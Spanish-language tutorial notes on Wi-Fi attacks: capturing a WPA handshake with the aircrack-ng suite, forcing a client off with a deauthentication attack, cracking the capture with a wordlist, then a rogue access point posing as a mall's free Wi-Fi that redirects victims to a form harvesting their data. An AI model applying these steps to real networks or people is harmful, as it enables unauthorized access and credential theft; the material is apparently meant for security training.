# Secuestro de handshake y Rogue AP

**CONCEPTOS CLAVE**

- **`Aircrack-ng`**: Es una suite de herramientas para auditoría y seguridad de redes Wi-Fi. Se usa para capturar datos de redes inalámbricas y crackear contraseñas de redes protegidas.
    
    ![1_anlLWC6WzK1ZqafjXg_f0Q.png]("Secuestro de handshake y Rogue AP"/1_anlLWC6WzK1ZqafjXg_f0Q.png)
    
- **`Antena con modo monitor`**: Es una antena o adaptador de red Wi-Fi que se configura para escuchar todo el tráfico de las redes cercanas, no solo el tráfico destinado a tu dispositivo. El modo monitor es esencial para analizar redes Wi-Fi.
    
    ![image-17.webp](Secuestro%20de%20handshake%20y%20Rogue%20AP%201f23549844818091a3d5d32144ba5eb0/image-17.webp)
    
- **`Frecuencia**:` En Wi-Fi, la frecuencia es la banda en la que la red transmite señales. Las redes Wi-Fi operan en frecuencias específicas, como 2.4 GHz y 5 GHz, que determinan la velocidad y el alcance de la conexión.
    
    ![840_560.jpg](Secuestro%20de%20handshake%20y%20Rogue%20AP%201f23549844818091a3d5d32144ba5eb0/8727f463-5519-4cf0-ab5e-4ba49583b479.png)
    
- **`Canales (1-12)**:` Los canales son subdivisiones dentro de las frecuencias de Wi-Fi (como 2.4 GHz). Cada canal tiene un número (del 1 al 12 en la banda de 2.4 GHz) y las redes Wi-Fi utilizan diferentes canales para evitar interferencias.
    
    ![canales.webp](Secuestro%20de%20handshake%20y%20Rogue%20AP%201f23549844818091a3d5d32144ba5eb0/canales.webp)
    

# INICIO

verificamos las interfaces de red,la que nos interesa es la de nuestra antena:

### Verificación de la antena

```bash
ip link
```

o

```bash
ip a
```

![image.png](Secuestro%20de%20handshake%20y%20Rogue%20AP%201f23549844818091a3d5d32144ba5eb0/image.png)

### Cambiar la antena al modo monitor

esto es importante ya que al estar en modo monitor captaremos los paquetes de la red a la que vayamos a auditar y lo haremos con la herramienta de la suite de `aircrack` ,llamada `airmon`:

```bash
sudo airmon-ng start wlx9c5322bcbd22
```

- **DESGLOSE**
    - **sudo**: Ejecuta el comando con permisos de administrador.
    - **airmon-ng**: Herramienta para poner tu tarjeta de red en modo monitor.
    - **start**: Inicia el modo monitor.
    - **wlx9c5322bcbd22**: El nombre de tu adaptador Wi-Fi específico.

![image.png](Secuestro%20de%20handshake%20y%20Rogue%20AP%201f23549844818091a3d5d32144ba5eb0/image%201.png)

### Localizar las redes WiFi a auditar

```bash
sudo airodump-ng wlx9c5322bcbd22
```

- **DESGLOSE**
    - **sudo**: Ejecuta el comando con privilegios de administrador.
    - **airodump-ng**: Herramienta de la suite **Aircrack-ng** para capturar paquetes de datos de redes Wi-Fi. Es útil para monitorear redes y recolectar información, como nombres de redes (SSID), direcciones MAC de los routers y dispositivos conectados.
    - **wlx9c5322bcbd22**: El nombre de tu adaptador Wi-Fi, que en este caso está en modo monitor (como lo configuraste con **airmon-ng**).

![image.png](Secuestro%20de%20handshake%20y%20Rogue%20AP%201f23549844818091a3d5d32144ba5eb0/image%202.png)

Es importante obtener el BSSID y el canal de la red a auditar.

`CH = CANAL`

`BSSID = identificador de la Red`

### Intervención

Una vez ejecutado, lo dejamos en escucha hasta que se conecte un dispositivo y captura el STATION del dispositivo para después poder desconectarlo.

![imagen.png](Secuestro%20de%20handshake%20y%20Rogue%20AP%201f23549844818091a3d5d32144ba5eb0/imagen.png)

![imagen.png](Secuestro%20de%20handshake%20y%20Rogue%20AP%201f23549844818091a3d5d32144ba5eb0/imagen%201.png)

![image.png](Secuestro%20de%20handshake%20y%20Rogue%20AP%201f23549844818091a3d5d32144ba5eb0/image%203.png)

1. comando para capturar el hanshake
    
    ```bash
    sudo airodump-ng -c 11 --bssid E8:65:D4:9D:95:70 -w handshake wlx9c5322bcbd22
    ```
    
    - **DESGLOSE**
        - **sudo**: Ejecuta el comando como administrador.
        - **airodump-ng**: Captura paquetes de redes Wi-Fi.
        - **c 11**: Monitorea el canal 11.
        - **-bssid <BSSID>**: Filtra por la red Wi-Fi con esa dirección MAC (BSSID).
        - **w handshake**: Guarda los paquetes en un archivo llamado **handshake.cap**.
        - **wlx9c5322bcbd22**: El adaptador Wi-Fi que usas para capturar.
2. Aqui vemos el BSSID de la red.
3. y Aqui vemos el BSSID y la STATION o MAC del dispositivo conectado.

### Expulsar usuario para recibir el handshake con la contraseña

En otra terminal ejecutamos varias veces lo siguiente para votar al dispositivo de la red:

```bash
sudo aireplay-ng -0 9 -a E8:65:D4:9D:95:70 -c 7E:53:A5:62:21:69 wlx9c5322bcbd22
```

- **DESGLOSE**
    - **sudo**: Ejecuta el comando con privilegios de administrador.
    - **aireplay-ng**: Es una herramienta de la suite **Aircrack-ng** que se utiliza para realizar diferentes tipos de ataques a redes Wi-Fi, como inyecciones de paquetes, desautenticación y más.
    - **0 9**: Esto indica un **ataque de desautenticación**. El `0` especifica el tipo de ataque (desautenticación), y el `9` significa que se enviarán **9 paquetes de desautenticación** para desconectar a un dispositivo de la red.
    - **a E8:65:D4:9D:95:70**: Es la **dirección MAC** del punto de acceso (router) de la red Wi-Fi a la que está conectado el dispositivo objetivo. El **BSSID** de la red.
    - **c 7E:53:A5:62:21:69**: Es la **dirección MAC** del dispositivo objetivo (el "station") que quieres desconectar de la red.
    - **wlx9c5322bcbd22**: Es el nombre de tu adaptador Wi-Fi que está en **modo monitor**, que se utiliza para enviar los paquetes de desautenticación.

![imagen.png](Secuestro%20de%20handshake%20y%20Rogue%20AP%201f23549844818091a3d5d32144ba5eb0/imagen%202.png)

![imagen.png](Secuestro%20de%20handshake%20y%20Rogue%20AP%201f23549844818091a3d5d32144ba5eb0/imagen%203.png)

### Romper el archivo .cap

![imagen.png](Secuestro%20de%20handshake%20y%20Rogue%20AP%201f23549844818091a3d5d32144ba5eb0/imagen%204.png)

![imagen.png](Secuestro%20de%20handshake%20y%20Rogue%20AP%201f23549844818091a3d5d32144ba5eb0/imagen%205.png)

```bash
sudo aircrack-ng -b E8:65:D4:9D:95:70 -w /usr/share/wordlists/rockyou.txt hanshake-02.cap
```

- **DESGLOSE**
    - **sudo**: Ejecuta como administrador.
    - **aircrack-ng**: Herramienta para crackear contraseñas de redes Wi-Fi.
    - **b E8:65:D4:9D:95:70**: Dirección MAC del router de la red en la que va a probar el diccionario para  ver si coincide el handshake con alguna de ellas.
    - **w /usr/share/wordlists/rockyou.txt**: Lista de contraseñas a probar.
    - **handshake-02.cap**: Archivo con los datos capturados de la red.

![imagen.png](Secuestro%20de%20handshake%20y%20Rogue%20AP%201f23549844818091a3d5d32144ba5eb0/imagen%206.png)

# Rogue AP (unauthorized  access point)

**Conceptos clave**

es un punto de acceso inalámbrico que se ha instalado en una red segura sin autorización explícita de un administrador de la red local, ya sea añadida por un empleado bien intencionado o por un atacante malicioso.

## INICIO

inicialmente clonamos la herramienta del repositorio con git 

```bash
sudo apt install git --> kali,parrot,etc
yay -S git -->Athena OS

git clone --depht 1 (url del repositorio)
```

y activamos la antena en modo monitor con airmon-ng que es una integracion de aircrack-ng

![image.png](Secuestro%20de%20handshake%20y%20Rogue%20AP%201f23549844818091a3d5d32144ba5eb0/image%201.png)

## REQUERIMIENTOS

![image.png](Secuestro%20de%20handshake%20y%20Rogue%20AP%201f23549844818091a3d5d32144ba5eb0/image%204.png)

1. **PHP**: Lenguaje de programación para crear páginas web dinámicas.
2. **dnsmasq**: Software que asigna direcciones IP y resuelve nombres de dominio en redes.
3. **hostapd**: Herramienta que convierte un dispositivo en un punto de acceso Wi-Fi, pudiendo ser usada para crear redes Wi-Fi falsas en un Rogue AP.
- **INSTALACIÓN**
    
    ```bash
    sudo apt install php
    sudo apt install dnsmasq
    sudo apt install hostpad
    ```
    

## ASIGNACIÓN DE CAMPOS PARA NUESTRO ROGUE AP

![image.png](Secuestro%20de%20handshake%20y%20Rogue%20AP%201f23549844818091a3d5d32144ba5eb0/image%205.png)

1. ahi escogemos nuestra antena.
2. asignamos el nombre del punto de acceso.
3. asignamos el canal por donde se va a transmitir el punto de acceso.
4. finalmente elegimos nuestro template o pagina que se va a mostrar al usuario.

## PASO FINAL

ahora una vez asignado los campos nos pone en modo escucha y nos pone un campo de victimas a conectarse:

![image.png](Secuestro%20de%20handshake%20y%20Rogue%20AP%201f23549844818091a3d5d32144ba5eb0/image%206.png)

### SIMULACIÓN DE LA VICTIMA

inicialmente la victima que esta en el mall vera la red libre aparentemente legitima del centro comercial pero sera nuestro Rogue AP

![imagen.png](Secuestro%20de%20handshake%20y%20Rogue%20AP%201f23549844818091a3d5d32144ba5eb0/imagen%207.png)

Se conectara:

![imagen.png](Secuestro%20de%20handshake%20y%20Rogue%20AP%201f23549844818091a3d5d32144ba5eb0/imagen%208.png)

una vez conectado lo que hará el rogue ap es redirigir a la victima al siguiente formulario:

![imagen.png](Secuestro%20de%20handshake%20y%20Rogue%20AP%201f23549844818091a3d5d32144ba5eb0/imagen%209.png)

una vez la victima llene los campos aparecerá lo siguiente:

![imagen.png](Secuestro%20de%20handshake%20y%20Rogue%20AP%201f23549844818091a3d5d32144ba5eb0/imagen%2010.png)

pero por detrás nosotros ya habremos recibido los datos.

![image.png](Secuestro%20de%20handshake%20y%20Rogue%20AP%201f23549844818091a3d5d32144ba5eb0/image%207.png)
